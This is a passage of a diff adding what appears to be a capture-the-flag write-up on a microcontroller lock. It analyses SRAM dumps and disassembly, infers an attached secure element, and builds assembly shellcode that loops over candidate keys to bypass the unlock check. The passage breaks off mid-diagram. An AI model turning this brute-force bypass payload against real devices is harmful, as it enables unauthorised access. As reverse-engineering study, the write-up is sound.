+00000010  5e 01 26 93 41 11 e4 c2  9f cd b8 e8 63 d5 bb 7b  |^.&.A.......c..{|
+00000020  fe ad 51 90 0a f5 e2 68  53 57 53 40 bf 5f ec 0f  |..Q....hSWS@._..|
+00000030  94 18 c8 b3 bd 57 96 23  18 0f 60 45 57 51 e0 3c  |.....W.#..`EWQ.<|
+00000040  40 65 9e d7 78 2e da c4  e1 11 28 62 a9 d5 c0 10  |@e..x.....(b....|
+00000050  5e 68 2e fa 0a 87 40 be  92 87 cf ba d8 09 d6 07  |^h....@.........|
+00000060  19 d0 fe 93 c2 23 b4 72  06 5b 22 8d 05 2a 9e bc  |.....#.r.["..*..|
+00000070  dd 39 d9 e1 c6 2e 3e 4f  39 c7 b2 e7 a6 aa 29 7e  |.9....>O9.....)~|
+00000080  bf 34 79 30 03 8f db 14  ac f3 fb e1 75 7d 77 71  |.4y0........u}wq|
+00000090  02 15 1d 34 68 34 5e b2  73 53 67 c1 84 d8 b6 0b  |...4h4^.sSg.....|
+000000a0  85 e8 7d 94 ed fb af eb  2b 2e 22 69 36 e3 13 ac  |..}.....+."i6...|
+000000b0  6b 99 5d 7d 1d 1b ea d3  81 e3 8e 8e bc af 66 33  |k.]}..........f3|
+000000c0  a2 36 6b f5 71 94 fa c6  c4 18 eb b9 82 02 08 7b  |.6k.q..........{|
+000000d0  b8 70 65 12 62 a1 2d 5c  d5 89 ad 78 aa 81 17 bb  |.pe.b.-\...x....|
+000000e0  c7 4c b0 f1 21 d4 43 56  27 d0 bb d6 94 eb 6f 59  |.L..!.CV'.....oY|
+000000f0  56 96 63 78 a8 92 d8 16  b6 c9 32 80 a1 d8 22 ab  |V.cx......2...".|
+00000100  2b b8 62 86 40 72 7f 12  31 cf f2 c4 bb 5c 56 37  |+.b.@r..1....\V7|
+00000110  6e 04 ef 90 69 c4 60 5f  61 b9 af 3a 7d 8e ad 53  |n...i.`_a..:}..S|
+00000120  01 b3 6a 94 f6 c0 e8 aa  77 e5 f5 49 51 55 4c 33  |..j.....w..IQUL3|
+00000130  5a 09 78 d4 23 2e ae 12  bb 3d 9d 5b 71 b6 d1 cb  |Z.x.#....=.[q...|
+00000140  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00001000
+</xmp></code></pre>
+
+<h5>Run 3:</h5>
+
+<pre><code><xmp>00000000  10 b7 d0 4b d8 66 a7 5b  a4 d9 8f 80 22 c8 35 bb  |...K.f.[....".5.|
+00000010  72 2c 8a 65 fc 9a 28 e6  04 12 d7 57 e5 a1 b8 1b  |r,.e..(....W....|
+00000020  7c 96 7f 0e 0e 4e b9 de  c5 2f b2 10 f0 c3 f0 37  ||....N.../.....7|
+00000030  9b a0 41 34 6b 01 93 c7  99 95 76 fd 80 63 5a 45  |..A4k.....v..cZE|
+00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00001000
+</xmp></code></pre>
+
+<h5>Run 4:</h5>
+
+<pre><code><xmp>00000000  39 b4 2d 38 15 1a 1c 09  6e 0c ad aa aa 96 72 db  |9.-8....n.....r.|
+00000010  96 8d 7f 99 16 c7 93 76  d3 e0 48 3a 33 bd 37 76  |.......v..H:3.7v|
+00000020  2e 91 dd 2d cb e2 90 ec  04 a7 26 a3 31 fe b7 37  |...-......&.1..7|
+00000030  43 a1 05 ce d2 93 e8 95  ee 45 43 81 94 39 27 4a  |C........EC..9'J|
+00000040  e6 19 8b 05 11 f0 26 2b  ff c9 43 ca 91 7b 64 01  |......&+..C..{d.|
+00000050  fc 07 2b 7c 42 3a 95 0e  4a c4 b9 65 bf 33 de bc  |..+|B:..J..e.3..|
+00000060  1d cc bb 04 a2 78 4a b6  cd e2 ae 5e 43 cf 8c 95  |.....xJ....^C...|
+00000070  a1 c8 36 96 34 48 bc 16  bd f8 93 b2 6c 3e d3 30  |..6.4H......l>.0|
+00000080  7b 7a 92 7b 38 e4 51 90  53 01 7f e0 2c e9 77 4a  |{z.{8.Q.S...,.wJ|
+00000090  c3 93 0c a6 49 5f 7f 22  12 56 39 2d f1 e3 5c 4e  |....I_.".V9-..\N|
+000000a0  48 b5 35 e0 c7 07 b4 e2  39 70 a0 ab 77 62 ac 7c  |H.5.....9p..wb.||
+000000b0  85 5f 06 fb 32 69 4b 1a  89 b5 a5 5a 7a b2 9f b3  |._..2iK....Zz...|
+000000c0  91 73 7f fd c9 17 6f 93  89 12 3d b0 01 83 fb 75  |.s....o...=....u|
+000000d0  2f fb 38 3f d4 31 14 d4  47 3f bd 70 89 25 dd e5  |/.8?.1..G?.p.%..|
+000000e0  c8 4e bc fa f6 84 0c 1f  7f 21 c2 56 a3 ff b9 42  |.N.......!.V...B|
+000000f0  0f d8 91 f2 d1 ed 86 96  ad 92 87 cb 6b c2 9e 88  |............k...|
+00000100  2c aa 36 17 d4 54 eb 1b  d9 54 d6 e9 90 f8 73 0e  |,.6..T...T....s.|
+00000110  6e f6 0c c3 5c 2e 29 7c  4f c5 5d 8d e7 ea fb 11  |n...\.)|O.].....|
+00000120  b2 0f bc 59 5e f7 d9 bb  d9 7d b6 08 4a 92 25 66  |...Y^....}..J.%f|
+00000130  71 39 18 1e eb 5d 69 60  a6 dc b0 fc aa 4b cf b5  |q9...]i`.....K..|
+00000140  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00001000
+</xmp></code></pre>
+
+<h5>Run 5:</h5>
+
+<pre><code><xmp>00000000  05 c5 b9 41 d9 ee 0b 22  f4 70 e1 3e 71 72 00 2c  |...A...".p.>qr.,|
+00000010  ad 47 ca 55 4a b7 d9 12  a6 74 6d 48 51 b0 de 32  |.G.UJ....tmHQ..2|
+00000020  00 96 06 90 ee 2e 90 f0  bf 42 30 d7 c2 48 fc f0  |.........B0..H..|
+00000030  85 00 19 b7 16 cc b2 77  51 ba 65 6a c9 b7 0a 2a  |.......wQ.ej...*|
+00000040  8e c3 e5 81 60 77 de 7f  f4 dc a7 5f d7 d8 30 ad  |....`w....._..0.|
+00000050  99 96 7c 4e ba c7 df 1f  0f b1 e5 14 cf 20 e2 3f  |..|N......... .?|
+00000060  35 27 07 6c 0d 77 6b dc  95 59 42 a8 aa 53 c2 61  |5'.l.wk..YB..S.a|
+00000070  aa 57 63 3d 9c 91 61 5b  e4 f1 b8 67 3f af 5c 6e  |.Wc=..a[...g?.\n|
+00000080  a7 34 49 51 5a 39 07 f0  1e a0 14 b3 d0 48 02 2c  |.4IQZ9.......H.,|
+00000090  39 05 58 14 80 e0 a1 13  2a ea 5f 5c 2c 3c 5d fc  |9.X.....*._\,<].|
+000000a0  6f 6e b7 51 06 00 07 99  03 9b 14 a8 f7 2a cd 75  |on.Q.........*.u|
+000000b0  32 12 1c 5a 57 3d bc 59  fc af 70 a9 a4 b3 24 d6  |2..ZW=.Y..p...$.|
+000000c0  06 99 79 9c 48 d3 7b e0  ff e8 d4 fe c6 cb 16 5d  |..y.H.{........]|
+000000d0  4f d9 e5 29 8f 91 88 76  4b 0b a7 b5 5c 09 2a de  |O..)...vK...\.*.|
+000000e0  ba cf 72 6a b7 d2 03 0c  cf e8 26 c3 a2 5d 28 9b  |..rj......&..](.|
+000000f0  18 0c 56 82 44 fc eb 93  31 62 57 c1 66 0f bc e6  |..V.D...1bW.f...|
+00000100  7f 48 66 d7 c9 23 98 12  b7 cd 73 ed e2 e7 6f f6  |.Hf..#....s...o.|
+00000110  fe 71 c6 4d 08 72 83 81  20 74 d4 3c 84 2c ac b5  |.q.M.r.. t.<.,..|
+00000120  59 e6 5c e4 72 54 26 e5  c0 51 1e 03 bb 2c 46 6b  |Y.\.rT&..Q...,Fk|
+00000130  b1 9a ac ce 23 64 02 71  38 fa 75 ed 0f 39 77 8d  |....#d.q8.u..9w.|
+00000140  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00001000
+</xmp></code></pre>
+
+<p>There are a few key takeaways from this. The size of the nonzero section seems to vary between runs (it may be either 0x40 or 0x140 bytes long). There is also no observable similarity between SRAM dumps when the length is the same.</p>
+
+<p>If executable code exists in SRAM, it changes drastically between runs. The ISA for this processor requires all instructions to be either 2, 4, 6, or 8 bytes long. Attempting to disassemble the first two payloads from offsets 0, 2, 4, and 6 should produce at least one disassembly listing where the executable segment is aligned and intelligible. It is also necessary to account for endianness reversal. The following Python script prints hex strings of SRAM (both big and little-endian).</p>
+
+<pre><code>import binascii
+
+with open('output.bin', 'rb') as f:
+	original = f.read()
+	byteswapped = bytearray(len(original))
+	byteswapped[0::2] = original[1::2]
+	byteswapped[1::2] = original[0::2]
+
+print(binascii.hexlify(original[0:0x150]))
+print(binascii.hexlify(byteswapped[0:0x150]))
+</code></pre>
+
+<p>Disassembling the hex strings produces output resembling the following:</p>
+
+<pre><code>228b           sub	@r11, sr
+2d55           add	@r5, r13
+bc29           jnc	$+0x37a
+a9b4 1ffb      bit	@r4, -0x4e1(r9)
+b20f           invalid	#0x8
+ddfe be29 fa54 and.b	0x29be(r14), 0x54fa(r13)
+e9f0 855e      and.b	@pc, 0x5e85(r9)
+3e05           rra	@r14+
+fca8 45a8      dadd.b	@r8+, -0x57bb(r12)
+c94e bc3f      mov.b	r14, 0x3fbc(r9)
+dd29           jnc	$+0x3bc
+599d 63dd      cmp.b	-0x229d(r13), r9
+d99b 7e3e 645e cmp.b	0x3e7e(r11), 0x5e64(r9)
+798a           sub.b	@r10+, r9
+19b0 f564      bit	0x64f5(pc), r9
+2c6a           addc	@r10, r12
+f004 387d      swpb	#0x7d38
+8c04           swpb	r12
+a1f2 abda      and	#0x4, -0x2555(sp)
+ef5d 0000      add.b	@r13, 0x0(r15)
+0000           rrc	pc
+0000           rrc	pc
+0000           rrc	pc
+0000           rrc	pc
+</code></pre>
+
+<p>Repeatedly disassembling after removing two, four, or six bytes from the beginning yields similarly unintelligible output. This pattern holds true for samples that are both 0x40 and 0x140 bytes long—regardless of endianness—and suggests an absence of executable code in SRAM.</p>
+
+<h2>Chip Identification</h2>
+<p>Based on the information acquired thus far, it is possible to conjecture about the "secure processor" class used by this system. Four pieces of circumstantial evidence stand out.</p>
+
+<ol>
+	<li>The manual command output refers to "secure memory" storing the key.</li>
+	<li>SRAM has a capacity of 4K.</li>
+	<li>There is no discernable executable code in SRAM.</li>
+	<li>The main MCU targets the highly embedded device market.</li>
+</ol>
+
+<p>These observations support the hypothesis that the external device is a secure element. The rationale for this is as follows.</p>
+
+<ul>
+	<li>"Secure memory" has been<label for="sn-1" class="sidenote-toggle sidenote-number"></label>
+
+<input type="checkbox" id="sn-1" class="sidenote-toggle" />
+<span class="sidenote">For example, see research by Olivier Hériveaux against the ATECC family of chips (i.e., <a href="https://www.sstic.org/media/SSTIC2020/SSTIC-actes/blackbox_laser_fault_injection_on_a_secure_memory/SSTIC2020-Article-blackbox_laser_fault_injection_on_a_secure_memory-heriveaux.pdf">ATECC508A</a> or <a href="https://www.youtube.com/watch?v=Kj1nVJypXPM">ATECC608B</a>). The term "secure element" may be a somewhat inaccurate description, as the author notes that the ATECC508A may be erroneously marketed as a secure element when it does not have the relevant certifications to meet that standard for security.
+
+<br><br>
+
+Regardless of whether the term "secure element" is accurate for describing the ATECC family of chips, this system resembles them because they have both GPIO pins and "secure memory."
+</span>
+
+		used synonymously with "secure element" in other contexts.</li>
+	<li>Secure elements are usually cheaper devices that have less storage than standard TPMs. 4KB is a miniscule quantity of memory for one of these; the usual<label for="sn-1" class="sidenote-toggle sidenote-number"></label>
+
+<input type="checkbox" id="sn-1" class="sidenote-toggle" />
+<span class="sidenote">For further details, see 7:07 to 11:11 in <a href="https://www.youtube.com/watch?v=LdW1FGUQgFo&t=427s">this video</a>.</span>
+
+			range is 6KB-50KB.</li> 
+	<li>The lack of apparent code in SRAM suggests that it is used only for sensitive data storage. This functionality is consistent with WolfSSL's description<label for="sn-1" class="sidenote-toggle sidenote-number"></label>
+
+<input type="checkbox" id="sn-1" class="sidenote-toggle" />
+<span class="sidenote">A text search for "secure memory" in the WolfSSL <a href="https://www.wolfssl.com/difference-hsm-tpm-secure-enclave-secure-element-hardware-root-trust/">page</a> from earlier locates only one instance of the term. This phrase is found only in the section describing secure elements.</span>
+
+		of the "secure memory" typically offered by secure elements.</li>
+	<li>It is unlikely that the system architects would have opted for a more expensive chip for a highly embedded and ostensibly low-cost device.</li>
+</ul>
+
+<h3>Refining The Scope</h3>
+<p>Assuming the "secure processor" is a secure element, the vendor typically develops the code running on it.</p> 
+
+<p>The contents of SRAM appear to be data only, which implies that there is separate memory for executable code (or that it might be an ASIC-based implementation). Lacking a way to leak executable code from the secure element, achieving code execution may be impossible. An authentication bypass vulnerability is the last contingency.</p>
+
+
+<p>The lack of SRAM consistency confirms the random generation of the 16-byte key during each run. Unblocking interrupt <code>0x7F</code> would require brute-forcing the calling convention for interrupt <code>0x41</code> and passing every possible key in SRAM.</p>
+
+<h2>The Secure Element API</h2>
+<h3>Dissecting The Calling Convention</h3>
+<p>Recall that interrupt <code>0x41</code> calculates the sha256 hash of SRAM <em>and</em> takes a key to unblock the unlock interrupt. The <code>sha256_internal</code> function is a wrapper around a call to interrupt <code>0x41</code>, so the <code>INT</code> call within <code>sha256_internal</code> provides a clue as to what calling convention interrupt <code>0x41</code> might expect when parsing the key.</p>
+
+
+<pre><code>45b6 &lt;sha256_internal&gt;
+45b6:  <mark>0d12           push	r13</mark>
+45b8:  <mark>0e12           push	r14</mark>
+45ba:  <mark>0f12           push	r15</mark>
+45bc:  3012 4100      push	#0x41
+45c0:  b012 5045      call	#0x4550 &lt;INT&gt;
+</code></pre>
+
+
+
+<p>The key is relatively large to be passed directly on the stack, so it is reasonable to assume that the secure element takes a pointer.
+
+If <code>sha256_internal</code> passes the start offset and length in <code>SP-0x4</code><label for="sn-1" class="sidenote-toggle sidenote-number"></label>
+
+<input type="checkbox" id="sn-1" class="sidenote-toggle" />
+<span class="sidenote">The value of <code>R14</code> pushed to the stack.</span>
+and 
+
+<code>SP-0x2</code><label for="sn-2" class="sidenote-toggle sidenote-number"></label>
+
+<input type="checkbox" id="sn-2" class="sidenote-toggle" />
+<span class="sidenote">The value of <code>R15</code> pushed to the stack.</span>
+
+before the call to <code>INT</code>, neither word could store a pointer to the key.</p>
+
+<pre><code class='language-ascii-noshadows'>      ┌────────────────────────────────────────┐
+      │                 STACK                  │
+┌──┐  ├──────┬─────────────────────────────────┤
+│SP├─►│SP+0x0│0x41 (INTERRUPT NUMBERR)         │
+└──┘  ├──────┼─────────────────────────────────┤
+      │<mark>SP+0x2</mark>│OFFSET                           │
+      ├──────┼─────────────────────────────────┤
+      │<mark>SP+0x4</mark>│LENGTH                           │
+      ├──────┼─────────────────────────────────┤
+      │SP+0x6│POINTER TO CHECKSUM RETURN BUFFER│
+      ├──────┼─────────────────────────────────┤
+      │SP+0x8│RETURN ADDRESS (MAIN)            │
+      ├──────┼─────────────────────────────────┤
+      │SP+0xa│???                              │
+      ├──────┼─────────────────────────────────┤
+      │SP+0xc│???                              │
+      ├──────┼─────────────────────────────────┤
+      │SP+0xe│???                              │
+      └──────┴─────────────────────────────────┘
+</code></pre>
+
+<p>This stack layout implies that <code>SP-0x6</code> might be a pointer to the location to write the checksum afterward <em>and</em> a pointer to the key. If this is the case, the checksum will overwrite the key after the interrupt call, and the implementation will pass a null key by default.</p>
+
+<pre><code class='language-ascii-noshadows'>┌──────────────────────────────────────────────┐
+│               CHECKSUM RETURN BUFFER         │
+├──────┬───────────────────────────────────────┤
+│BEFORE│0000 0000 0000 0000 0000 0000 0000 0000│
+└──────┴──────────┬────────────────────────────┘
+                  │
+                  ▼
+       ┌────────────────────┐
+       │CALL sha256_internal│
+       └──────────┬─────────┘
+                  │
+                  ▼
+┌──────┬───────────────────────────────────────┐
+│AFTER │XXXX XXXX XXXX XXXX XXXX XXXX XXXX XXXX│
+└──────┴───────────────────────────────────────┘
+</code></pre>
+
+<p>This potential side effect (among others) will require the payload to have a custom clean-up routine between interrupt calls.</p>
+
+<p>Alternately, one of the other unused stack words below <code>SP-0x6</code> might be a pointer to the key.</p>
+
+
+<pre><code class='language-ascii-noshadows'>      ┌────────────────────────────────────────┐
+      │                 STACK                  │
+┌──┐  ├──────┬─────────────────────────────────┤
+│SP├─►│SP+0x0│0x41 (INTERRUPT NUMBERR)         │
+└──┘  ├──────┼─────────────────────────────────┤
+      │SP+0x2│OFFSET                           │
+      ├──────┼─────────────────────────────────┤
+      │SP+0x4│LENGTH                           │
+      ├──────┼─────────────────────────────────┤
+      │SP+0x6│POINTER TO CHECKSUM RETURN BUFFER│
+      ├──────┼─────────────────────────────────┤
+      │<mark>SP+0x8</mark>│RETURN ADDRESS (MAIN)            │
+      ├──────┼─────────────────────────────────┤
+      │<mark>SP+0xa</mark>│???                              │
+      ├──────┼─────────────────────────────────┤
+      │<mark>SP+0xc</mark>│???                              │
+      ├──────┼─────────────────────────────────┤
+      │<mark>SP+0xe</mark>│???                              │
+      └──────┴─────────────────────────────────┘
+</code></pre>
+
+<p>This eventuality is unlikely in practice because <code>SP+0x8</code> contains the return address for <code>sha256_internal</code>. If this word is a pointer to the key, that implies that <code>sha256_internal</code> is deliberately ignoring the correct calling convention and passing a chunk of instruction memory as a key. It is also unlikely that the three words after that are used as pointers because they overlap the checksum return buffer (which happens to be just afterward on the stack).</p> 
+
+
+<pre><code class='language-ascii-noshadows'>      ┌────────────────────────────────────────┐
+      │                 STACK                  │
+┌──┐  ├──────┬─────────────────────────────────┤
+│SP├─►│SP+0x0│0x41 (INTERRUPT NUMBERR)         │
+└──┘  ├──────┼─────────────────────────────────┤
+      │SP+0x2│OFFSET                           │
+      ├──────┼─────────────────────────────────┤
+      │SP+0x4│LENGTH                           │
+      ├──────┼─────────────────────────────────┤
+      │SP+0x6│POINTER TO CHECKSUM RETURN BUFFER├──┐
+      ├──────┼─────────────────────────────────┤  │
+      │SP+0x8│RETURN ADDRESS (MAIN)            │  │
+      ├──────┼─────────────────────────────────┤  │
+      │<mark>SP+0xa</mark>│CHECKSUM RETURN BUFFER + 0x0     │◄─┘
+      ├──────┼─────────────────────────────────┤
+      │<mark>SP+0xc</mark>│CHECKSUM RETURN BUFFER + 0x2     │
+      ├──────┼─────────────────────────────────┤
+      │<mark>SP+0xe</mark>│CHECKSUM RETURN BUFFER + 0x4     │
+      └──────┴─────────────────────────────────┘
+</code></pre>
+
+<p>While it would be bizarre, this kind of breakage is not out of the question.</p>
+
+<h3>Search Space</h3>
+<p>The key is at an unknown offset, and the contents of SRAM vary in length between runs. There are 48 or 304 possible offsets where the key could start, depending on the size of the nonzero data in SRAM for the current run.</p>
+
+<pre><code>&gt;&gt;&gt; 0x40-16
+48
+&gt;&gt;&gt; 0x140-16
+304
+</code></pre>
+
+<p>It is unclear whether the contents of SRAM are byte or word addressed, which means that the key could parse as sixteen bytes or eight little-endian words that are two bytes wide. This possibility requires reversing the endianness for every two-byte word in the leaked data.</p>
+
+<pre><code>&gt;&gt;&gt; (0x40-16)*2
+96
+&gt;&gt;&gt; (0x140-16)*2
+608
+</code></pre>
+
+<p>Accounting for both the endianness and the exact offset being unknown, there are 608 possible keys on the high end.</p>
+
+<h3>Approach To Automation</h3>
+<p>Emulators/debuggers exist for this system that might allow for easier integration with higher-level tooling (i.e., Python), but none of these support the new undocumented interrupts (including 0x40 and 0x41).</p>
+
+<p>There are two options:</p>
+<ol>
+	<li>Patch instructions into memory, wrap the provided debugger with a higher-level language or framework, expose an API, and write custom code to make calls to it.</li>
+	<li>Write all the code in assembly and load it into memory as a debug payload.</li>
+	</ol>
+
+	<p>The provided debugger has a bug where it will freeze when single-stepped too quickly, so the latter approach is preferable. The former option also runs slower and will still require some artisan assembly.</p>
+
+	<h3>Key Endianness</h3>
+	<p>The first task is modifying the rainbow table Python script to produce a second output that swaps the endianness for every word. Appending extra logic to the end of the existing code accomplishes this.</p>
+
+	<pre><code><xmp>output_little_endian = b''
+for i in range(0, len(output), 2):
+    output_little_endian += (output[i+1]).to_bytes(1, "big")
+    output_little_endian += (output[i]).to_bytes(1, "big")
+
+with open("output_little_endian.bin", "wb") as f:
+    f.write(output)
+
+print(binascii.hexlify(output_little_endian).decode())
+</xmp></code></pre>
+
+<h2>Second Stage Payload</h2>
+<h3>Data Section Tweaks</h3>
+<p>Changes to the data section are as follows.</p>
+<pre><code>3040 0080 ffff <mark>0003</mark>
+<mark>ffaf 00b5</mark> 0000 0000
+0000 0000 0000 0000
+0000 0000 0000 0000
+0000 0000 0000 0000
+0000 0000 0000 0000
+</code></pre>
+
+<p>Given that differential analysis of SRAM dumps indicates that there are usually no more than 0x140 bytes of nonzero data, the upper bound of memory to leak has been lowered from 0x1000 to 0x300.</p>
+
+
+<pre><code>3040 0080 ffff <mark>0003</mark>
+ffaf 00b5 0000 0000
+0000 0000 0000 0000
+0000 0000 0000 0000
+0000 0000 0000 0000
+0000 0000 0000 0000
+</code></pre>
+
+<h3>Extending The Shellcode</h3>
+
+<p>There must be a mechanism to read the contents of SRAM into MCU memory after the external rainbow table lookups are complete.</p>
+
+
+<pre><code class='language-ascii-noshadows'>      ┌─────────┬─────────────────────┐
+      │3e40 00f0│mov  #0xf000, r14    │
+      ├─────────┼─────────────────────┤
+      │3f40 0090│mov  <mark>#0x9000</mark>, r15    │
+┌──┐  ├─────────┼─────────────────────┤
+│PC├─►│b012 6845│call #0x4568 &lt;getsn&gt; │
+└──┘  └─────────┴─────────────────────┘
+
+                        ┌─────────────────────┐
+                        │      EXTERNAL       │
+                        ├─────────────────────┤
+                        │[RECOVERED SRAM DATA]│
+                        └─────────┬───────────┘
+                                  │
+                                  │ READ
+                                  │ INTO
+                                  ▼
+      ┌────────────────┬────────┬────┬───┬────┐
+      │                │CONTENTS│0000│...│0000│
+      │CANONICAL BUFFER├────────┼────┼───┼────┤
+      │                │ADDRESS │<mark>9000</mark>│...│9300│
+      └────────────────┴────────┴────┴───┴────┘
+</code></pre>
+
+<p>This <code>getsn</code> call will read 0xF000<label for="sn-1" class="sidenote-toggle sidenote-number"></label>
+
+<input type="checkbox" id="sn-1" class="sidenote-toggle" />
+<span class="sidenote">The buffer size for the input is arbitrarily large—convenient but not strictly necessary.</span>
+
+
+bytes from user input and write them to address <code>0x9000</code> in the main MCU memory. This buffer will be the canonical, unchanging copy of the SRAM data.</p>
+
+<p>Following this, the shellcode copies the entire input buffer to address <code>0xB000</code> via a call to memcpy:</p>
+
+<pre><code class='language-ascii-noshadows'>      ┌─────────┬─────────────────────┐
+      │3e40 00f0│mov  #0xf000, r14    │
+      ├─────────┼─────────────────────┤
+      │3f40 0090│mov  #0x9000, r15    │
+      ├─────────┼─────────────────────┤
+      │b012 6845│call #0x4568 &lt;getsn&gt; │
+      ├─────────┼─────────────────────┤
+      │3d40 0010│<mark>mov  #0x1000, r13</mark>    │
+      ├─────────┼─────────────────────┤
+      │3e40 0090│<mark>mov  #0x9000, r14</mark>    │
+      ├─────────┼─────────────────────┤
+      │3f40 00b0│<mark>mov  #0xb000, r15</mark>    │
+┌──┐  ├─────────┼─────────────────────┤
+│PC├─►│b012 a445│<mark>call #0x45a4 &lt;memcpy&gt;</mark>│
+└──┘  └─────────┴─────────────────────┘
+
+                                 ┌──────────────┐
+                                 │              │
+      ┌────────────────┬────────┬┴───┬───┬────┐ │
+      │                │CONTENTS│XXXX│...│0000│ │
+      │CANONICAL BUFFER├────────┼────┼───┼────┤ │
+      │                │ADDRESS │<mark>9000</mark>│...│9300│ │
+      └────────────────┴────────┴────┴───┴────┘ │
+                                                │
+                              ┌─────────────────┘
+                              ▼
+      ┌─────────────┬────────┬────┬───┬────┐
+      │             │CONTENTS│XXXX│...│0000│
+      │SHADOW BUFFER├────────┼────┼───┼────┤
+      │             │ADDRESS │<mark>B000</mark>│...│B300│
+      └─────────────┴────────┴────┴───┴────┘
+</code></pre>
+
+<p>This code is part of a loop run before every call to interrupt <code>0x41</code>. The memory at address <code>0xB000</code> is a shadow buffer. The shellcode will overwrite it with unchanging data sourced from the canonical buffer at address <code>0x9000</code> during each iteration, ensuring that unknown side effects do not corrupt the shadow buffer data after the return from the interrupt callgate.</p>
+
+<p>Next is the counter for the current position in the shadow buffer:</p>
+
+<pre><code class='language-ascii-noshadows'>       ┌─────────┬─────────────────────┐
+       │3e40 00f0│mov  #0xf000, r14    │
+       ├─────────┼─────────────────────┤
+       │3f40 0090│mov  #0x9000, r15    │
+       ├─────────┼─────────────────────┤
+       │b012 6845│call #0x4568 &lt;getsn&gt; │
+       ├─────────┼─────────────────────┤
+       │3d40 0010│mov  #0x1000, r13    │
+       ├─────────┼─────────────────────┤
+       │3e40 0090│mov  #0x9000, r14    │
+       ├─────────┼─────────────────────┤
+       │3f40 00b0│mov  #0xb000, r15    │
+       ├─────────┼─────────────────────┤
+       │b012 a445│call #0x45a4 &lt;memcpy&gt;│
+┌───┐  ├─────────┼─────────────────────┤
+│PC¹├─►│1d42 0a80│mov  &amp;0x800a, r13    │
+├───┤  ├─────────┼─────────────────────┤
+│PC²├─►│1d53     │inc  r13             │
+├───┤  ├─────────┼─────────────────────┤
+│PC³├─►│824d 0a80│mov  r13, &amp;0x800a    │
+└───┘  └─────────┴─────────────────────┘
+
+       ┌──────┐
+       │      │
+       │ DATA │
+       │      │
+       ├──────┤
+       │ 3040 │
+       ├──────┤
+       │ 0080 │
+       ├──────┤
+       │ FFFF │
+       ├──────┤      ┌────┐           ┌────┐
+       │ 0003 │      │R13:│           │R13:│
+       ├──────┤ LOAD¹├────┤ INCREMENT²├────┤
+     ┌►│ <mark>FFAF</mark> ├─────►│AFFF├──────────►│B000│
+     │ ├──────┤      └────┘           └─┬──┘
+     │ │ 00b5 │                         │
+     │ ├──────┤                         │
+     │ │ .... │                         │
+     │ ├──────┤                         │
+     │ │ .... │                         │
+     │ └──────┘                         │
+     │               STORE³             │
+     └──────────────────────────────────┘
+
+</code></pre>
+
+<p>The fifth word in the data section stores this variable:</p>
+
+<pre><code>3040 0080 ffff 0003
+<mark>ffaf</mark> 00b5 0000 0000
+0000 0000 0000 0000
+0000 0000 0000 0000
+0000 0000 0000 0000
+0000 0000 0000 0000
+</code></pre>
+
+<p>The value of <code>0xAFFF</code> will be incremented by 0x1, making it <code>0xB000</code> (the beginning of the shadow buffer). This value is the address for the current key candidate. It will be incremented by one with each iteration of the loop.</p>
+
+<h5>current_offset = 1</h5>
+<pre><code class='language-ascii-noshadows'>  ┌──────┐
+  │      │
+  │ DATA │
+  │      │
+  ├──────┤
+  │ 3040 │
+  ├──────┤
+  │ 0080 │
+  ├──────┤
+  │ FFFF │
+  ├──────┤      ┌────┐           ┌────┐
+  │ 0003 │      │R13:│           │R13:│
+  ├──────┤ LOAD¹├────┤ INCREMENT²├────┤
+┌►│ 00B0 ├─────►│B000├──────────►│<mark>B001</mark>│
+│ ├──────┤      └────┘           └─┬──┘
+│ │ 00b5 │                         │
+│ ├──────┤                         │
+│ │ .... │                         │
+│ ├──────┤                         │
+│ │ .... │                         │
+│ └──────┘                         │
+│               STORE³             │
+└──────────────────────────────────┘
+</code></pre>
+
+<h5>current_offset = 2</h5>
+<pre><code class='language-ascii-noshadows'>  ┌──────┐
+  │      │
+  │ DATA │
+  │      │
+  ├──────┤
+  │ 3040 │
+  ├──────┤
+  │ 0080 │
+  ├──────┤
+  │ FFFF │
+  ├──────┤      ┌────┐           ┌────┐
+  │ 0003 │      │R13:│           │R13:│
+  ├──────┤ LOAD¹├────┤ INCREMENT²├────┤
+┌►│ 01B0 ├─────►│B001├──────────►│<mark>B002</mark>│
+│ ├──────┤      └────┘           └─┬──┘
+│ │ 00b5 │                         │
+│ ├──────┤                         │
+│ │ .... │                         │
+│ ├──────┤                         │
+│ │ .... │                         │
+│ └──────┘                         │
+│               STORE³             │
+└──────────────────────────────────┘
+</code></pre>
+
+<p>The calling convention for the interrupt is as follows:</p>
+
+<pre><code class='language-ascii-noshadows'>      ┌─────────┬─────────────────────┐
+      │3e40 00f0│mov  #0xf000, r14    │
+      ├─────────┼─────────────────────┤
+      │3f40 0090│mov  #0x9000, r15    │
+      ├─────────┼─────────────────────┤
+      │b012 6845│call #0x4568 &lt;getsn&gt; │
+      ├─────────┼─────────────────────┤
+      │3d40 0010│mov  #0x1000, r13    │
+      ├─────────┼─────────────────────┤
+      │3e40 0090│mov  #0x9000, r14    │
+      ├─────────┼─────────────────────┤
+      │3f40 00b0│mov  #0xb000, r15    │
+      ├─────────┼─────────────────────┤
+      │b012 a445│call #0x45a4 &lt;memcpy&gt;│
+      ├─────────┼─────────────────────┤
+      │1d42 0a80│mov  &amp;0x800a, r13    │
+      ├─────────┼─────────────────────┤
+      │1d53     │inc  r13             │
+      ├─────────┼─────────────────────┤
+      │824d 0a80│mov  r13, &amp;0x800a    │
+      ├─────────┼─────────────────────┤
+      │0d12     │<mark>push r13</mark>             │
+      ├─────────┼─────────────────────┤
+      │0d12     │<mark>push r13</mark>             │
+      ├─────────┼─────────────────────┤
+      │0d12     │<mark>push r13</mark>             │
+      ├─────────┼─────────────────────┤
+      │0d12     │<mark>push r13</mark>             │
+      ├─────────┼─────────────────────┤
+      │2312     │<mark>push #0x2</mark>            │
+      ├─────────┼─────────────────────┤
+      │2312     │<mark>push #0x2</mark>            │
+      ├─────────┼─────────────────────┤
+      │3012 4100│<mark>push #0x41</mark>           │
+┌──┐  ├─────────┼─────────────────────┤
+│PC├─►│b012 5045│<mark>call #0x4550 &lt;INT&gt;</mark>   │
+└──┘  ├─────────┼─────────────────────┤
+      │3150 0e00│add  #0xe, sp        │
+      └─────────┴─────────────────────┘
+
+      ┌──────────────────────────────────────────────────┐
+      │                 STACK                            │
+┌──┐  ├──────┬───────────────────────────────────────────┤
